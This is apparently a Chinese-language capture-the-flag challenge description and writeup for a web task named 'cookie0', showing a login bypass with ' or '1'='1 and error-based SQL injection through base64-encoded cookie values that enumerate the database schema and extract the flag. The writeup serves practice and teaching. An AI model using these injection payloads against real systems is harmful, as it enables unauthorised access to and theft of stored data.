## 题目信息

出题人 MercyL1n

出题时间 201910

题目名字 cookie0

题目类型 web

题目难度 中

## 题目描述

粗心的Mercy设置好flag后忘记了自己的账号密码,只记得账号是MercyL1n了

## 题目考点

base64编码

sql报错注入&绕过

## 题目环境

1.ubuntu 16.04

2.Apache2

3.php7

## 题目writeup

密码输入' or '1'='1绕过登陆

burpsuite抓包修改cookie

![1571319370229](C:\Users\18506\AppData\Roaming\Typora\typora-user-images\1571319370229.png)

```
Cookie: uname=IiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCI6Iiwoc2VsZWN0IGdyb3VwX2NvbmNhdChzY2hlbWFfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuc2NoZW1hdGEpKSkgIw==
-> " and extractvalue(1,concat(":",(select group_concat(schema_name) from information_schema.schemata))) #
->  syntax error: ':information_schema,mercyl1n,mys'

Cookie: uname=IiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCI6Iiwoc2VsZWN0IGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hID0gJ21lcmN5bDFuJykpKSAj
->" and extractvalue(1,concat(":",(select group_concat(table_name) from information_schema.tables where table_schema = 'mercyl1n'))) #
->syntax error: ':user'

Cookie: uname=IiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCI6Iiwoc2VsZWN0IGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lID0gJ3VzZXInKSkpICM=
->" and extractvalue(1,concat(":",(select group_concat(column_name) from information_schema.columns where table_name = 'user'))) #
->syntax error: ':id,uname,passwd,flag,Host,User,'

Cookie: uname=IiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCI6Iiwoc2VsZWN0IGZsYWcgZnJvbSBtZXJjeWwxbi51c2VyKSkpICM=
->" and extractvalue(1,concat(":",(select flag from mercyl1n.user))) #
->flag{easy_cookie_sqli}


```

